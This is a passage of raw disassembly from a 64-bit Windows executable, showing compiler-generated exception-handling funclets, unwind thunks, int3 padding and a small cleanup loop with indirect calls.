   140007bb7:	e9 a4 cc ff ff       	jmp    0x140004860
   140007bbc:	cc                   	int3
   140007bbd:	cc                   	int3
   140007bbe:	cc                   	int3
   140007bbf:	cc                   	int3
   140007bc0:	48 8d 8a 30 00 00 00 	lea    0x30(%rdx),%rcx
   140007bc7:	e9 24 cc ff ff       	jmp    0x1400047f0
   140007bcc:	48 8d 8a 50 00 00 00 	lea    0x50(%rdx),%rcx
   140007bd3:	e9 38 ba ff ff       	jmp    0x140003610
   140007bd8:	cc                   	int3
   140007bd9:	cc                   	int3
   140007bda:	cc                   	int3
   140007bdb:	cc                   	int3
   140007bdc:	cc                   	int3
   140007bdd:	cc                   	int3
   140007bde:	cc                   	int3
   140007bdf:	cc                   	int3
   140007be0:	48 8d 8a 90 01 00 00 	lea    0x190(%rdx),%rcx
   140007be7:	e9 74 cc ff ff       	jmp    0x140004860
   140007bec:	48 8d 8a 40 00 00 00 	lea    0x40(%rdx),%rcx
   140007bf3:	e9 68 cc ff ff       	jmp    0x140004860
   140007bf8:	48 8d 8a 60 00 00 00 	lea    0x60(%rdx),%rcx
   140007bff:	e9 5c cc ff ff       	jmp    0x140004860
   140007c04:	48 8d 8a 80 00 00 00 	lea    0x80(%rdx),%rcx
   140007c0b:	e9 50 cc ff ff       	jmp    0x140004860
   140007c10:	48 8d 8a a0 00 00 00 	lea    0xa0(%rdx),%rcx
   140007c17:	e9 44 cc ff ff       	jmp    0x140004860
   140007c1c:	48 8d 8a c0 00 00 00 	lea    0xc0(%rdx),%rcx
   140007c23:	e9 38 cc ff ff       	jmp    0x140004860
   140007c28:	48 8d 8a e0 00 00 00 	lea    0xe0(%rdx),%rcx
   140007c2f:	e9 2c cc ff ff       	jmp    0x140004860
   140007c34:	40 55                	rex push %rbp
   140007c36:	48 83 ec 20          	sub    $0x20,%rsp
   140007c3a:	48 8b ea             	mov    %rdx,%rbp
   140007c3d:	4c 8d 0d 1c cc ff ff 	lea    -0x33e4(%rip),%r9        # 0x140004860
   140007c44:	41 b8 07 00 00 00    	mov    $0x7,%r8d
   140007c4a:	ba 20 00 00 00       	mov    $0x20,%edx
   140007c4f:	48 8d 4d 40          	lea    0x40(%rbp),%rcx
   140007c53:	e8 8c ed ff ff       	call   0x1400069e4
   140007c58:	48 83 c4 20          	add    $0x20,%rsp
   140007c5c:	5d                   	pop    %rbp
   140007c5d:	c3                   	ret
   140007c5e:	48 8d 8a 38 01 00 00 	lea    0x138(%rdx),%rcx
   140007c65:	e9 b6 e7 ff ff       	jmp    0x140006420
   140007c6a:	48 8d 8a 70 01 00 00 	lea    0x170(%rdx),%rcx
   140007c71:	e9 6a cb ff ff       	jmp    0x1400047e0
   140007c76:	cc                   	int3
   140007c77:	cc                   	int3
   140007c78:	cc                   	int3
   140007c79:	cc                   	int3
   140007c7a:	cc                   	int3
   140007c7b:	cc                   	int3
   140007c7c:	cc                   	int3
   140007c7d:	cc                   	int3
   140007c7e:	cc                   	int3
   140007c7f:	cc                   	int3
   140007c80:	40 55                	rex push %rbp
   140007c82:	48 83 ec 20          	sub    $0x20,%rsp
   140007c86:	48 8b ea             	mov    %rdx,%rbp
   140007c89:	8b 45 20             	mov    0x20(%rbp),%eax
   140007c8c:	83 e0 01             	and    $0x1,%eax
   140007c8f:	85 c0                	test   %eax,%eax
   140007c91:	74 15                	je     0x140007ca8
   140007c93:	83 65 20 fe          	andl   $0xfffffffe,0x20(%rbp)
   140007c97:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
   140007c9b:	48 81 c1 a8 00 00 00 	add    $0xa8,%rcx
   140007ca2:	ff 15 10 05 00 00    	call   *0x510(%rip)        # 0x1400081b8
   140007ca8:	48 83 c4 20          	add    $0x20,%rsp
   140007cac:	5d                   	pop    %rbp
   140007cad:	c3                   	ret
   140007cae:	48 8b 8a 30 00 00 00 	mov    0x30(%rdx),%rcx
   140007cb5:	48 83 c1 10          	add    $0x10,%rcx
   140007cb9:	48 ff 25 d0 04 00 00 	rex.W jmp *0x4d0(%rip)        # 0x140008190
   140007cc0:	48 8b 8a 30 00 00 00 	mov    0x30(%rdx),%rcx
   140007cc7:	48 83 c1 08          	add    $0x8,%rcx
   140007ccb:	e9 e0 db ff ff       	jmp    0x1400058b0
   140007cd0:	48 8d 8a 50 00 00 00 	lea    0x50(%rdx),%rcx
   140007cd7:	e9 f4 96 ff ff       	jmp    0x1400013d0
   140007cdc:	cc                   	int3
   140007cdd:	cc                   	int3
   140007cde:	cc                   	int3
   140007cdf:	cc                   	int3
   140007ce0:	48 8d 8a 58 00 00 00 	lea    0x58(%rdx),%rcx
   140007ce7:	e9 44 cd ff ff       	jmp    0x140004a30
   140007cec:	cc                   	int3
   140007ced:	cc                   	int3
   140007cee:	cc                   	int3
   140007cef:	cc                   	int3
   140007cf0:	48 8d 8a 28 00 00 00 	lea    0x28(%rdx),%rcx
   140007cf7:	48 ff 25 e2 04 00 00 	rex.W jmp *0x4e2(%rip)        # 0x1400081e0
   140007cfe:	48 8d 8a 30 00 00 00 	lea    0x30(%rdx),%rcx
   140007d05:	e9 46 e1 ff ff       	jmp    0x140005e50
   140007d0a:	cc                   	int3
   140007d0b:	cc                   	int3
   140007d0c:	cc                   	int3
   140007d0d:	cc                   	int3
   140007d0e:	cc                   	int3
   140007d0f:	cc                   	int3
   140007d10:	48 8d 8a 30 00 00 00 	lea    0x30(%rdx),%rcx
   140007d17:	e9 c4 e8 ff ff       	jmp    0x1400065e0
   140007d1c:	40 55                	rex push %rbp
   140007d1e:	48 83 ec 20          	sub    $0x20,%rsp
   140007d22:	48 8b ea             	mov    %rdx,%rbp
   140007d25:	80 7d 20 00          	cmpb   $0x0,0x20(%rbp)
   140007d29:	75 16                	jne    0x140007d41
   140007d2b:	4c 8b 4d 78          	mov    0x78(%rbp),%r9
   140007d2f:	4c 8b 45 70          	mov    0x70(%rbp),%r8
   140007d33:	48 8b 55 68          	mov    0x68(%rbp),%rdx
   140007d37:	48 8b 4d 60          	mov    0x60(%rbp),%rcx
   140007d3b:	e8 10 ed ff ff       	call   0x140006a50
   140007d40:	90                   	nop
   140007d41:	48 83 c4 20          	add    $0x20,%rsp
   140007d45:	5d                   	pop    %rbp
   140007d46:	c3                   	ret
   140007d47:	cc                   	int3
   140007d48:	40 53                	rex push %rbx
   140007d4a:	55                   	push   %rbp
   140007d4b:	48 83 ec 28          	sub    $0x28,%rsp
   140007d4f:	48 8b ea             	mov    %rdx,%rbp
   140007d52:	48 89 4d 30          	mov    %rcx,0x30(%rbp)
   140007d56:	48 8b 45 30          	mov    0x30(%rbp),%rax
   140007d5a:	48 8b 08             	mov    (%rax),%rcx
   140007d5d:	48 89 4d 28          	mov    %rcx,0x28(%rbp)
   140007d61:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140007d65:	81 38 63 73 6d e0    	cmpl   $0xe06d7363,(%rax)
   140007d6b:	74 0c                	je     0x140007d79
   140007d6d:	c7 45 20 00 00 00 00 	movl   $0x0,0x20(%rbp)
   140007d74:	8b 45 20             	mov    0x20(%rbp),%eax
   140007d77:	eb 22                	jmp    0x140007d9b
   140007d79:	e8 6a fb ff ff       	call   0x1400078e8
   140007d7e:	48 8b 4d 28          	mov    0x28(%rbp),%rcx
   140007d82:	48 89 08             	mov    %rcx,(%rax)
   140007d85:	48 8b 45 30          	mov    0x30(%rbp),%rax
   140007d89:	48 8b 58 08          	mov    0x8(%rax),%rbx
   140007d8d:	e8 5c fb ff ff       	call   0x1400078ee
   140007d92:	48 89 18             	mov    %rbx,(%rax)
   140007d95:	e8 60 fb ff ff       	call   0x1400078fa
   140007d9a:	90                   	nop
   140007d9b:	48 83 c4 28          	add    $0x28,%rsp
   140007d9f:	5d                   	pop    %rbp
   140007da0:	5b                   	pop    %rbx
   140007da1:	c3                   	ret
   140007da2:	cc                   	int3
   140007da3:	40 55                	rex push %rbp
   140007da5:	48 83 ec 20          	sub    $0x20,%rsp
   140007da9:	48 8b ea             	mov    %rdx,%rbp
   140007dac:	48 8b d1             	mov    %rcx,%rdx
   140007daf:	48 8b 09             	mov    (%rcx),%rcx
   140007db2:	8b 09                	mov    (%rcx),%ecx
   140007db4:	e8 59 fb ff ff       	call   0x140007912
   140007db9:	90                   	nop
   140007dba:	48 83 c4 20          	add    $0x20,%rsp
   140007dbe:	5d                   	pop    %rbp
   140007dbf:	c3                   	ret
   140007dc0:	cc                   	int3
   140007dc1:	40 55                	rex push %rbp
   140007dc3:	48 8b ea             	mov    %rdx,%rbp
   140007dc6:	48 8b 01             	mov    (%rcx),%rax
   140007dc9:	33 c9                	xor    %ecx,%ecx
   140007dcb:	81 38 05 00 00 c0    	cmpl   $0xc0000005,(%rax)
   140007dd1:	0f 94 c1             	sete   %cl
   140007dd4:	8b c1                	mov    %ecx,%eax
   140007dd6:	5d                   	pop    %rbp
   140007dd7:	c3                   	ret
   140007dd8:	cc                   	int3
   140007dd9:	cc                   	int3
   140007dda:	cc                   	int3
   140007ddb:	cc                   	int3
   140007ddc:	40 53                	rex push %rbx
   140007dde:	48 83 ec 20          	sub    $0x20,%rsp
   140007de2:	eb 3d                	jmp    0x140007e21
   140007de4:	48 8b 03             	mov    (%rbx),%rax
   140007de7:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   140007deb:	48 89 05 8e 55 00 00 	mov    %rax,0x558e(%rip)        # 0x14000d380
   140007df2:	48 8b 01             	mov    (%rcx),%rax
   140007df5:	48 8b 40 10          	mov    0x10(%rax),%rax
   140007df9:	ff 15 51 08 00 00    	call   *0x851(%rip)        # 0x140008650
   140007dff:	48 8b c8             	mov    %rax,%rcx
   140007e02:	48 85 c0             	test   %rax,%rax
   140007e05:	74 11                	je     0x140007e18
   140007e07:	48 8b 10             	mov    (%rax),%rdx
   140007e0a:	48 8b 02             	mov    (%rdx),%rax
   140007e0d:	ba 01 00 00 00       	mov    $0x1,%edx
   140007e12:	ff 15 38 08 00 00    	call   *0x838(%rip)        # 0x140008650
   140007e18:	48 8b cb             	mov    %rbx,%rcx
   140007e1b:	ff 15 5f 06 00 00    	call   *0x65f(%rip)        # 0x140008480
   140007e21:	48 8b 1d 58 55 00 00 	mov    0x5558(%rip),%rbx        # 0x14000d380
   140007e28:	48 85 db             	test   %rbx,%rbx
   140007e2b:	75 b7                	jne    0x140007de4
   140007e2d:	48 83 c4 20          	add    $0x20,%rsp
   140007e31:	5b                   	pop    %rbx
   140007e32:	c3                   	ret
